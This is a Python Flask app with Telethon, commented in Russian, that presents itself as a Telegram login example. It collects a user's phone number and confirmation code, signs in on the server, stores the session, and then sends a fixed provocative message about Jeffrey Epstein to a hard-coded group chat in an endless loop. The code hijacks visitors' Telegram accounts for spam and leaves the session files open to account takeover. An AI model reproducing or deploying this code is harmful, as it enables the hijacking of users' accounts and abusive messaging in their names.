import os
import secrets
import asyncio
from flask import Flask, session, request, redirect, url_for, render_template
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from dotenv import load_dotenv

load_dotenv()

# Для Windows
if os.name == 'nt':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY')

API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')

# Целевой чат: можно указать username (например, "mygroup" или "@mygroup")
# или числовой ID (для супергруппы с минусом, например "-1001234567890")
TARGET_CHAT = -4912925619  # замените на правильный username или ID
MESSAGE_TEXT = "джефри эапштейн нивчём не виноват"

def get_telethon_session_id():
    if 'telethon_session_id' not in session:
        session['telethon_session_id'] = secrets.token_hex(16)
    return session['telethon_session_id']

async def send_code(phone, session_name):
    client = TelegramClient(session_name, API_ID, API_HASH)
    await client.connect()
    result = await client.send_code_request(phone)
    await client.disconnect()
    return result.phone_code_hash

async def sign_in(phone, code, phone_code_hash, session_name):
    client = TelegramClient(session_name, API_ID, API_HASH)
    await client.connect()
    try:
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
    except SessionPasswordNeededError:
        raise
    finally:
        await client.disconnect()
    return True

async def send_message_to_group(session_name, target, text):
    client = TelegramClient(session_name, API_ID, API_HASH)
    await client.connect()
    try:
        # target может быть строкой: username (с @ или без) или числовой ID как строка
        entity = await client.get_entity(target)
        await client.send_message(entity, text)
    except Exception as e:
        # Логируем ошибку, но не прерываем вход
        print(f"Error sending message: {e}")
    finally:
        await client.disconnect()

async def get_me(session_name):
    client = TelegramClient(session_name, API_ID, API_HASH)
    await client.connect()
    me = await client.get_me()
    await client.disconnect()
    return me

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        phone = request.form['phone']
        session['phone'] = phone
        session_id = get_telethon_session_id()
        session_name = f'session_{session_id}'
        try:
            phone_code_hash = asyncio.run(send_code(phone, session_name))
            session['phone_code_hash'] = phone_code_hash
        except Exception as e:
            return f"Error sending code: {e}"
        return redirect(url_for('code'))
    return render_template('index.html')

@app.route('/code', methods=['GET', 'POST'])
def code():
    if 'phone' not in session or 'phone_code_hash' not in session:
        return redirect(url_for('index'))

    if request.method == 'POST':
        code = request.form['code']
        phone = session['phone']
        phone_code_hash = session['phone_code_hash']
        session_id = get_telethon_session_id()
        session_name = f'session_{session_id}'
        try:
            # Выполняем вход
            asyncio.run(sign_in(phone, code, phone_code_hash, session_name))
            # Отправляем сообщение в целевой чат
            while 0<1:

                asyncio.run(send_message_to_group(session_name, TARGET_CHAT, MESSAGE_TEXT))
            session['logged_in'] = True
            # Очищаем временные данные
            session.pop('phone_code_hash', None)
            return redirect(url_for('profile'))
        except SessionPasswordNeededError:
            # Здесь можно добавить форму для пароля
            return "Two‑factor authentication is enabled. This example does not handle it."
        except Exception as e:
            return f"Error during sign in: {e}"

    return render_template('code.html')

@app.route('/profile')
def profile():
    if not session.get('logged_in'):
        return redirect(url_for('index'))

    session_id = get_telethon_session_id()
    session_name = f'session_{session_id}'
    try:
        me = asyncio.run(get_me(session_name))
    except Exception as e:
        return f"Error getting profile: {e}"
    return render_template('profile.html', user=me)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=True)